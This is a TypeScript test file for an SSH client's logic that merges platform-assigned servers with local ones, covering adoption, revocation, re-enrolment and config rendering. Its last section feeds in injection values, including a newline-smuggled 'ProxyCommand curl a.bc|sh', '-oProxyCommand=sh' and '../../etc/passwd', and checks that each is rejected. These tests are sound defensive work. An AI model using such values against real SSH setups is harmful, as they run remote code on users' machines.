import { describe, expect, it } from "bun:test";
import type { FleetServer, Server, ServerGrant } from "@shared/servers";
import { grantOpens, grantPending, grantWithdrawn } from "@shared/servers";
import { mergeFleet } from "../fleet-run";
import { appSshPaths, renderSshConfig, sshArgs } from "../ssh-config";

const DEVICE_KEY = "/data/keys/device";

const PATHS = appSshPaths("/data", "/home/jean");

const GRANTED: FleetServer = {
  host: "203.0.113.10",
  hostFingerprint: "SHA256:atelier",
  id: "srv-platform-1",
  keyReady: true,
  name: "vps-atelier",
  organization: { id: "org-1", name: "Flyleaf" },
  port: 22,
  status: "active",
  user: "dev",
};

const TYPED: Server = {
  host: "203.0.113.10",
  id: "srv-local-1",
  keyPath: "/data/keys/srv-local-1",
  name: "Mon serveur",
  origin: "app",
  port: 22,
  user: "root",
};

function merge(
  local: Server[],
  granted: FleetServer[],
  active: string | null = null,
  dismissed: string[] = []
) {
  return mergeFleet({
    active,
    deviceKeyPath: DEVICE_KEY,
    dismissed,
    granted,
    local,
  });
}

function grantOf(servers: readonly Server[]): ServerGrant {
  const found = servers[0]?.grant;

  if (!found) {
    throw new Error("le serveur n'a pas d'attribution");
  }

  return found;
}

describe("an assigned server", () => {
  it("enters the list with the address and key nobody typed", () => {
    const merged = merge([], [GRANTED]);

    expect(merged.adopted).toEqual(["srv-platform-1"]);
    expect(merged.config.servers).toEqual([
      {
        grant: {
          adopted: true,
          id: "srv-platform-1",
          keyReady: true,
          listed: true,
          opened: false,
          status: "active",
        },
        host: "203.0.113.10",
        hostFingerprint: "SHA256:atelier",
        id: "srv-platform-1",
        keyPath: DEVICE_KEY,
        name: "vps-atelier",
        origin: "app",
        port: 22,
        slug: "vps-atelier",
        user: "dev",
      },
    ]);
  });

  it("leaves its SSH name to a local server that already carries it", () => {
    const merged = merge(
      [{ ...TYPED, host: "198.51.100.7", slug: "vps-atelier" }],
      [GRANTED]
    );

    expect(merged.config.servers.map((server) => server.slug)).toEqual([
      "vps-atelier",
      undefined,
    ]);
  });

  it("becomes the driven server when the app had none", () => {
    expect(merge([], [GRANTED]).config.active).toBe("srv-platform-1");
  });

  it("leaves the driven server in place when there already was one", () => {
    expect(merge([TYPED], [GRANTED], "srv-local-1").config.active).toBe(
      "srv-local-1"
    );
  });

  it("opens through the app's SSH configuration, on the device's key", () => {
    const [server] = merge([], [GRANTED]).config.servers;

    expect(sshArgs(server, PATHS)).toEqual([
      "-F",
      "/data/ssh/config",
      "pupitre-srv-platform-1",
    ]);

    const written = renderSshConfig([server], PATHS, "darwin");

    expect(written).toContain("Host pupitre-srv-platform-1");
    expect(written).toContain("HostName 203.0.113.10");
    expect(written).toContain("User dev");
    expect(written).toContain(`IdentityFile ${DEVICE_KEY}`);
    expect(written).toContain("StrictHostKeyChecking yes");
  });

  it("follows the address and account the platform publishes afterwards", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const moved = merge(
      [adopted],
      [{ ...GRANTED, host: "203.0.113.11", port: 2222, user: "ada" }]
    );

    expect(moved.adopted).toEqual([]);
    expect(moved.config.servers[0]).toMatchObject({
      host: "203.0.113.11",
      id: "srv-platform-1",
      port: 2222,
      user: "ada",
    });
  });

  it("keeps the name the person gave it here", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const renamed = { ...adopted, name: "Atelier" };

    expect(merge([renamed], [GRANTED]).config.servers[0].name).toBe("Atelier");
  });

  it("does not enter the list until the platform has its address", () => {
    const merged = merge([], [{ ...GRANTED, host: null }]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.adopted).toEqual([]);
  });
});

describe("a server the app already knows", () => {
  it("receives its assignment without being added a second time", () => {
    const merged = merge([TYPED], [GRANTED], "srv-local-1");

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.adopted).toEqual([]);
    expect(merged.config.servers[0]).toMatchObject({
      grant: { adopted: false, id: "srv-platform-1", listed: true },
      id: "srv-local-1",
    });
  });

  it("keeps the account hardening opened here", () => {
    const hardened = { ...TYPED, user: "dev" };
    const merged = merge([hardened], [{ ...GRANTED, user: "root" }]);

    expect(merged.config.servers[0].user).toBe("dev");
  });

  it("keeps its own key rather than the device's", () => {
    expect(merge([TYPED], [GRANTED]).config.servers[0].keyPath).toBe(
      "/data/keys/srv-local-1"
    );
  });

  it("pins the fingerprint the platform publishes if it had none", () => {
    expect(merge([TYPED], [GRANTED]).config.servers[0].hostFingerprint).toBe(
      "SHA256:atelier"
    );
  });

  it("does not follow an address from the platform once linked", () => {
    const linked = merge([TYPED], [GRANTED]).config.servers;
    const moved = merge(linked, [{ ...GRANTED, host: "203.0.113.99" }]);

    expect(moved.config.servers[0].host).toBe("203.0.113.10");
  });

  it("stays intact when the platform does not know it", () => {
    const merged = merge([TYPED], []);

    expect(merged.config.servers).toEqual([TYPED]);
    expect(merged.withdrawn).toEqual([]);
  });
});

describe("revocation", () => {
  it("erases the server the platform no longer lists, since it had placed it", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], []);

    expect(merged.config.servers).toEqual([]);
    expect(merged.released).toEqual(["srv-platform-1"]);
    expect(merged.changed).toBe(true);
  });

  it("erases the server the platform returns as revoked", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [{ ...GRANTED, status: "revoked" }]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.released).toEqual(["srv-platform-1"]);
  });

  it("keeps the server that was typed here, whether or not the assignment lapsed", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const merged = merge(bound, []);

    expect(merged.released).toEqual([]);
    expect(merged.config.servers[0].grant).toMatchObject({ listed: false });
  });

  it("restores a suspended server at the first sign of return", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const suspended = merge([adopted], [{ ...GRANTED, status: "suspended" }]);
    const back = merge(suspended.config.servers, [GRANTED]);

    expect(suspended.config.servers).toHaveLength(1);
    expect(back.withdrawn).toEqual([]);
    expect(back.config.servers[0].grant).toMatchObject({ status: "active" });
  });
});

describe("removal on this computer", () => {
  it("does not readopt an assigned server that was removed", () => {
    const merged = merge([], [GRANTED], null, ["srv-platform-1"]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.adopted).toEqual([]);
  });

  it("keeps the memory of the removal while the platform assigns it", () => {
    expect(
      merge([], [GRANTED], null, ["srv-platform-1"]).config.dismissed
    ).toEqual(["srv-platform-1"]);
  });

  it("forgets the removal as soon as the platform stops assigning it", () => {
    const merged = merge([], [], null, ["srv-platform-1"]);

    expect(merged.config.dismissed).toEqual([]);
    expect(merged.changed).toBe(true);
  });

  it("returns the server as soon as the memory of the removal is erased", () => {
    expect(merge([], [GRANTED], null, []).config.servers).toHaveLength(1);
  });
});

describe("re-enrolment", () => {
  const REENROLLED: FleetServer = { ...GRANTED, id: "srv-platform-2" };

  it("follows the same machine under its new identifier, without duplicating it", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [REENROLLED]);

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.config.servers[0].grant).toMatchObject({
      id: "srv-platform-2",
      listed: true,
    });
  });

  it("also follows a server that was typed here", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const merged = merge(bound, [REENROLLED]);

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.config.servers[0].id).toBe("srv-local-1");
    expect(merged.config.servers[0].grant).toMatchObject({
      adopted: false,
      id: "srv-platform-2",
    });
  });

  it("does not confuse two servers the platform still lists, both of them", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [GRANTED, REENROLLED]);

    expect(merged.config.servers).toHaveLength(2);
    expect(merged.config.servers[0].grant).toMatchObject({
      id: "srv-platform-1",
    });
  });
});

describe("the state of an assignment", () => {
  it("opens when the platform lists it, active, with the key ready", () => {
    expect(grantOpens(grantOf(merge([], [GRANTED]).config.servers))).toBe(true);
  });

  it("waits while the platform has no key for this account", () => {
    const waiting = grantOf(
      merge([], [{ ...GRANTED, keyReady: false }]).config.servers
    );

    expect(grantPending(waiting)).toBe(true);
    expect(grantOpens(waiting)).toBe(false);
  });

  it("waits while the server enrols", () => {
    const enrolling = grantOf(
      merge([], [{ ...GRANTED, status: "enrolling" }]).config.servers
    );

    expect(grantPending(enrolling)).toBe(true);
  });

  it("is removed as soon as the platform stops listing it", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const gone = grantOf(merge(bound, []).config.servers);

    expect(grantWithdrawn(gone)).toBe(true);
    expect(grantPending(gone)).toBe(false);
  });
});

describe("the merge", () => {
  it("reports no change when nothing changed", () => {
    const first = merge([], [GRANTED]);
    const again = merge(first.config.servers, [GRANTED], first.config.active);

    expect(first.changed).toBe(true);
    expect(again.changed).toBe(false);
  });

  it("does not touch a system host", () => {
    const system: Server = {
      host: "atelier",
      id: "srv-system",
      name: "atelier",
      origin: "system",
      port: 22,
      user: "",
    };

    expect(merge([system], [GRANTED]).config.servers[0]).toEqual(system);
  });
});

describe("an assignment that would carry an SSH directive", () => {
  const INJECTION = "x\nProxyCommand curl a.bc|sh";

  const UNFIT: FleetServer[] = [
    { ...GRANTED, user: INJECTION },
    { ...GRANTED, user: "-oProxyCommand=sh" },
    { ...GRANTED, host: INJECTION },
    { ...GRANTED, host: "-oProxyCommand=sh" },
    { ...GRANTED, id: `srv${INJECTION}` },
    { ...GRANTED, id: "../../etc/passwd" },
    { ...GRANTED, port: 0 },
    { ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` },
  ];

  it("never enters the list", () => {
    for (const granted of UNFIT) {
      const merged = merge([], [granted]);

      expect(merged.adopted).toEqual([]);
      expect(merged.config.servers).toEqual([]);
    }
  });

  it("leaves an already adopted server the address and account it had", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;

    for (const granted of UNFIT.filter((unfit) => unfit.id === GRANTED.id)) {
      const [kept] = merge([adopted], [granted]).config.servers;

      expect(kept?.host).toBe("203.0.113.10");
      expect(kept?.user).toBe(GRANTED.user);
      expect(kept?.port).toBe(GRANTED.port);
      expect(kept?.hostFingerprint).toBe("SHA256:atelier");
      expect(
        renderSshConfig(merge([adopted], [granted]).config.servers, PATHS)
      ).not.toContain("ProxyCommand");
    }
  });

  it("does not lend its fingerprint to a server typed here", () => {
    const [kept] = merge(
      [TYPED],
      [{ ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` }]
    ).config.servers;

    expect(kept?.hostFingerprint).toBeUndefined();
  });
});
